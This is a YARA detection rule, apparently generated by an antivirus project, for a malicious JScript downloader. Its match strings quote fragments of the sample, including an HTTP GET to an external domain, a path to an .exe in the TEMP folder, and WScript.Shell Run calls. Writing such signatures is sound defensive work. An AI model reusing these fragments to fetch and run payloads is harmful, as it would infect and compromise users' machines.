rule sig_20160329_b17a6c747fcd5e894de09c3308d787ce {
  meta:
    description = "datamaliciousorder - file 20160329_b17a6c747fcd5e894de09c3308d787ce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "de58da79cdbfd462a8848db50bbcd2538fc14ea3b7f0667626925b1c215ec0df"

  strings:
    $s1  = "yi[R](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function RH() {return iC[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lBc9XKR6.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[A1](E() * 11); if (yi[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function g(We, Tc){r = r * 1; return We - Tc;};" fullword ascii
    $s5  = "var iC = function cE() {return WScript[q](\"WScript.Shell\");}(), I = 11;" fullword ascii
    $s6  = "function IL(){return \"\" + T;};" fullword ascii
    $s7  = "function Q(TU){iC[\"Run\"](TU, r, r);};" fullword ascii
    $s8  = "function G() {return ((X == true) && (X == yI)) ? 1 : r;};" fullword ascii
    $s9  = "function E(){return 22;};" fullword ascii
    $s10 = "function B(){return q;};" fullword ascii
    $s11 = "return g(J, mV);" fullword ascii
    $s12 = " while (Dd){" fullword ascii
    $s13 = "function lJ()" fullword ascii
    $s14 = "function A(Z) {var A0 = (1, 2, 3, 4, 5, Z); return A0;};" fullword ascii
    $s15 = "var n = new this[\"Date\"]();" fullword ascii
    $s16 = "var yI = false;" fullword ascii
    $s17 = "var xC = false;" fullword ascii
    $s18 = "yI = true; " fullword ascii
    $s19 = "} catch(h){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}